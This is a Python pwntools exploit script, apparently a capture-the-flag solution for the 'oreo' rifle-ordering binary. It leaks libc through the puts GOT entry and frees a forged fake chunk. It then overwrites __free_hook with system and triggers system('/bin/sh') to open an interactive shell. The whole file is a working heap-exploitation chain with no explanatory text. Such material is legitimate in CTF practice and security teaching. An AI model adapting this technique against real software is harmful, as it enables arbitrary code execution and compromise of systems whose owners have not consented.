from pwn import *
import six
# context.log_level = "debug"

def add(descrip, name):
    p.sendline('1')
    #p.recvuntil('Rifle name: ')
    p.sendline(name)
    p.sendline(descrip)


def show_rifle():
    p.sendline('2')
    p.recvuntil('===================================\n')


def order():
    p.sendline('3')


def message(notice):
    p.sendline('4')
    p.sendline(notice)
    
def log(x , y):
	print(x  + " : " + hex(y))

p = process("./oreo")
elf = ELF("./oreo")
libc = ELF("./libc.so.6")


if __name__ == '__main__':
    p.recvuntil("Exit!\n")
    
    # leak_libc
    puts_got = elf.got["puts"]
    payload = "a" * (27) + p32(puts_got)
    add("123" , payload)
    show_rifle()
    p.recvuntil("Description: ")
    p.recvuntil("Description: ")
    puts_addr = u32(p.recv(4))
    log("puts" , puts_addr)
    libc_base = puts_addr - libc.sym["puts"]
    log("libc_base" , libc_base)
    system = libc_base + libc.sym["system"]
    str_bin_sh = libc_base + libc.search("/bin/sh\x00").next()
    
    get = lambda x : p32(libc_base + libc.sym[x]) 
    # step 2  free fake chunk
    rifle = 1 
    for i in range(0x3f):
        add(str(i) , str(i))
    payload = 0x1c * 'a' + p32(0) 
    payload += p32(0) + p32(0x100)

    message(payload)

    add("123" , "a" * 27 + p32(0x804A2A8))
    order() 
    # get shell 
    free_got = elf.got["free"]
    add(get("__free_hook") , "")

    message(get("system"))

    add("/bin/sh\x00" ,"")
    order()
    p.recvuntil("Okay order submitted!")
    p.interactive()